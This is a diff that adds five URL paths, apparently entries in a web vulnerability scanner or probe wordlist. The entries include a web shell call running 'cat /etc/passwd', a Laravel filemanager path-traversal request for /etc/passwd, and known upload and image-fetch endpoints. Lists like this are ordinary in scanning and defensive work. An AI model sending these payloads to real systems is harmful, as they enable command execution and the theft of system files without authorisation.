@@ -1,0 +1,5 @@
+/poc.jsp/
+/poc.jsp?cmd=cat+%2Fetc%2Fpasswd
+/laravel-filemanager/download?working_dir=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&type=&file=passwd
+/ueditor/net/controller.ashx?action=catchimage&encode=utf-8
+/service/~baseapp/UploadServlet
